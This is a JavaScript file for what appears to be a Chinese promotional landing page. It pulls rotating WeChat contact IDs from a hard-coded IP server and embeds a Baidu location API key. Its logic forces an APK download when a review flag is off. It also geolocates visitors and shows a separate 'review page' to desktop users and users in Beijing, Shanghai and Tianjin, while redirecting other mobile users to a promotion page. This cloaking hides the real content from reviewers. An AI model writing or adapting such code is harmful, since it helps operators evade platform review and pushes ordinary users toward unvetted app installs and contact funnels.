//后台配置
var Wechat = '',
    timeout;
uploadUrl = window.location.href;
var outerWx;

// 获取URL参数
function getUrlParams(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); //定义正则表达式
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return decodeURI(r[2]);
    return null;
}

function loadWX(tar) {
    console.log();
    $.ajax({
        url: "http://47.115.57.209:7777/admin/index/randWx?id=" + getUrlParams('id'),
        type: "get",
        cache: false,
        data: {},
        dataType: "json",
        crossDomain: true,
        xhrFields: {
            'Access-Control-Allow-Origin': '*'
        },
        success: function (data) {
            if (data.code == '10000') {
                if (data.data.is_shenhe == 0) {
                    window.location.href = "http://www.flypush.com/KXY keepfit.apk";
                    // $('#beforeCheck').show()
                    // $('#wrapper').hide()
                } else {
                    if (data.data.jump_url) {
                        window.location.href = data.data.jump_url;
                    } else {
                        $('#beforeCheck').hide()
                        $('#wrapper').show()
                    }

                }
                tar.text(data.data.wx_num);
                $('#share_title').text(data.data.share_title);
                $('.wechat_txt3').parents('#copyBtn').attr('data-clipboard-text', data.data.wx_num)
            } else {
                $('#beforeCheck').show()
                alert(data.msg)
            }
        }
    });
}

$(document).ready(function () {
    var tar = $('.wechat_txt,.wechat_txt2,.wechat_txt3');
    console.log(tar);
    loadWX(tar);
    protect();
    var timer = setInterval(function () {
        if (outerWx) {
            clearInterval(timer);
            $('.wechat_txt,.wechat_txt2,.wechat_txt3').text(outerWx);
            $('.qr').attr('src', outerPhoto);
        }
    }, 100)
});

//防挂部分
function protect() {
    if (outerWx == '') {
        arrNum = ['ysyxs0003', 'hxs0028', 'hxs0024', 'hxs0012', 'ysyxs0001'];
        var numIndex = Math.floor((Math.random() * arrNum.length));
        var appendNum = arrNum[numIndex];
        $('.wechat_txt').text(appendNum);
        $('.wx_txt').text(appendNum);
        console.log('backstage down!');
    }
}

function ipCheck() {
    var sendjson = {
        ak: 'LQtWKXgMHkTpFpgvXFkjXuPD361pqrrd',
        coor: 'bd09ll'
    }
    var cover = false
    $.ajax({
        type: "get",
        url: "https://api.map.baidu.com/location/ip",
        data: sendjson,
        dataType: 'jsonp',
        async: true,
        success: function (data) {
            var userwidth = window.screen.width;
            var ipAddress = data.address
            var coverCity = ['北京', '上海', '天津']

            for (var i = 0; i < coverCity.length; i++) {
                if (ipAddress.indexOf(coverCity[i]) > 0) {
                    cover = true
                }
            }

            if (!cover && userwidth <= 1000) {
                window.location.href = 'https://lvshou.dwlv.net/promotionPage2_17/index_58.html'
            } else {
                // 审核页面
                $('#sh_page').show();
                $('#web').hide();
                $('body').css('max-width', '1200px');
                $('title').text('天魅生')
            }
        },
        error: function (data) {
            console.log(data)
        }
    });
}
